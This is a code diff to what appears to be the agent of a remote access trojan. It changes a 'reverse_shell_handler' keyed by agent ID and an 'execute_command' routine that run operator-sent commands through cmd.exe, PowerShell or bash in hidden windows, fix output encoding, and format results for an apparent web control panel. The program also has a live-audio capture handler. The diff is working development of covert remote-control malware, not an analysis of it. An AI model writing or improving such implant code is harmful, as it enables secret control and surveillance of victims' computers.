@@ -7453,34 +7453,65 @@ def reverse_shell_handler(agent_id):
                     # Execute regular command
                     try:
                         if WINDOWS_AVAILABLE:
-                            # Fix PowerShell execution - use proper command formatting
-                            if command.strip().lower().startswith('powershell'):
-                                # If it's already a PowerShell command, execute directly
+                            # Get CMD.exe path
+                            cmd_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cmd.exe')
+                            
+                            # Check if it's a PowerShell command
+                            powershell_indicators = ['Get-', 'Set-', 'New-', 'Remove-', 'Start-', 'Stop-', '$']
+                            is_powershell = any(indicator in command for indicator in powershell_indicators)
+                            
+                            if is_powershell or command.strip().lower().startswith('powershell'):
+                                # Use PowerShell with proper formatting
+                                ps_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
+                                                          'WindowsPowerShell', 'v1.0', 'powershell.exe')
+                                
+                                # Add Out-String -Width 200 to preserve formatting
+                                if '| Out-String' not in command:
+                                    formatted_command = f"{command} | Out-String -Width 200"
+                                else:
+                                    formatted_command = command
+                                
                                 result = subprocess.run(
-                                    ["powershell.exe", "-NoProfile", "-Command", command],
+                                    [ps_exe_path, "-NoProfile", "-Command", formatted_command],
                                     capture_output=True,
-                                    text=True,
+                                    text=False,  # Get bytes for proper encoding
                                     timeout=30,
                                     creationflags=subprocess.CREATE_NO_WINDOW
                                 )
                             else:
-                                # For regular commands, wrap in PowerShell properly
+                                # Use CMD.exe with proper encoding
                                 result = subprocess.run(
-                                    ["powershell.exe", "-NoProfile", "-Command", f"& {{{command}}}"],
+                                    [cmd_exe_path, "/c", "chcp 65001 >nul & " + command],
                                     capture_output=True,
-                                    text=True,
+                                    text=False,  # Get bytes for proper encoding
                                     timeout=30,
                                     creationflags=subprocess.CREATE_NO_WINDOW
                                 )
+                            
+                            # Decode output properly
+                            try:
+                                stdout = result.stdout.decode('utf-8', errors='replace')
+                                stderr = result.stderr.decode('utf-8', errors='replace')
+                            except:
+                                try:
+                                    stdout = result.stdout.decode('cp437', errors='replace')
+                                    stderr = result.stderr.decode('cp437', errors='replace')
+                                except:
+                                    stdout = result.stdout.decode('cp1252', errors='replace')
+                                    stderr = result.stderr.decode('cp1252', errors='replace')
+                            
+                            response = stdout + stderr
                         else:
+                            # Linux/Unix
                             result = subprocess.run(
                                 ["bash", "-c", command],
                                 capture_output=True,
                                 text=True,
                                 timeout=30
                             )
-                        response = result.stdout + result.stderr
-                        if not response:
+                            response = result.stdout + result.stderr
+                        
+                        if not response or not response.strip():
                             response = "[Command executed successfully - no output]\n"
                     except subprocess.TimeoutExpired:
                         response = "[Command timed out after 30 seconds]\n"
@@ -8598,8 +8629,21 @@ def handle_live_audio(command_parts):
         return "Live audio processed successfully"
     except Exception as e:
         return f"Live audio processing failed: {e}"
+def format_command_output(output):
+    """
+    Format command output to preserve alignment and spacing.
+    Wraps output in <pre> tags for proper monospace display.
+    """
+    if not output:
+        return output
+    
+    # Wrap in <pre> tag to preserve formatting in HTML
+    # This ensures columns stay aligned in web interface
+    formatted = f"<pre style='font-family: Consolas, Monaco, \"Courier New\", monospace; white-space: pre; overflow-x: auto;'>{output}</pre>"
+    return formatted
+
 def execute_command(command):
-    """Execute a command and return its output - SMART AUTO-DETECTION"""
+    """Execute a command and return its output - SMART AUTO-DETECTION with PRESERVED FORMATTING"""
     try:
         log_message(f"[CMD] Executing: {command}", "info")
         
@@ -8684,30 +8728,74 @@ def execute_command(command):
                 # Use PowerShell for PowerShell-specific commands
                 log_message(f"[CMD] Using PowerShell: {ps_exe_path}", "debug")
                 
+                # PowerShell with proper output formatting
+                # Add Out-String -Width 200 to preserve formatting
+                formatted_command = f"{command} | Out-String -Width 200"
+                
                 result = subprocess.run(
-                    [ps_exe_path, "-NoProfile", "-NonInteractive", "-Command", command],
+                    [ps_exe_path, "-NoProfile", "-NonInteractive", "-Command", formatted_command],
                     capture_output=True,
-                    text=True,
-                    encoding='utf-8',  # ✅ Force UTF-8 encoding
-                    errors='replace',  # ✅ Replace invalid characters instead of crashing
+                    text=False,  # Get bytes first for proper encoding detection
                     timeout=30,
                     creationflags=subprocess.CREATE_NO_WINDOW,
                     env=os.environ.copy()
                 )
+                
+                # Decode with proper Windows console encoding
+                try:
+                    # Try UTF-8 first
+                    stdout = result.stdout.decode('utf-8', errors='replace')
+                    stderr = result.stderr.decode('utf-8', errors='replace')
+                except:
+                    # Fallback to Windows default encoding (cp1252 or cp437)
+                    import locale
+                    encoding = locale.getpreferredencoding() or 'cp437'
+                    stdout = result.stdout.decode(encoding, errors='replace')
+                    stderr = result.stderr.decode(encoding, errors='replace')
+                
+                # Create result-like object
+                class Result:
+                    pass
+                result = Result()
+                result.stdout = stdout
+                result.stderr = stderr
+                
             else:
                 # Use CMD.exe for standard/translated commands
                 log_message(f"[CMD] Using CMD.exe: {cmd_exe_path}", "debug")
                 
+                # For CMD, capture bytes first for proper encoding
                 result = subprocess.run(
-                    [cmd_exe_path, "/c", command],
+                    [cmd_exe_path, "/c", "chcp 65001 >nul & " + command],  # Force UTF-8 output
                     capture_output=True,
-                    text=True,
-                    encoding='utf-8',  # ✅ Force UTF-8 encoding
-                    errors='replace',  # ✅ Replace invalid characters instead of crashing
+                    text=False,  # Get bytes first
                     timeout=30,
                     creationflags=subprocess.CREATE_NO_WINDOW,
                     env=os.environ.copy()
                 )
+                
+                # Decode with proper encoding
+                try:
+                    # Try UTF-8 (after chcp 65001)
+                    stdout = result.stdout.decode('utf-8', errors='replace')
+                    stderr = result.stderr.decode('utf-8', errors='replace')
+                except:
+                    # Fallback to Windows console encoding
+                    try:
+                        # Try cp437 (US English console)
+                        stdout = result.stdout.decode('cp437', errors='replace')
+                        stderr = result.stderr.decode('cp437', errors='replace')
+                    except:
+                        # Final fallback to cp1252 (Windows default)
+                        stdout = result.stdout.decode('cp1252', errors='replace')
+                        stderr = result.stderr.decode('cp1252', errors='replace')
+                
+                # Create result-like object
+                class Result:
+                    pass
+                result = Result()
+                result.stdout = stdout
+                result.stderr = stderr
         else:
             # Use bash on Linux/Unix systems
             result = subprocess.run(
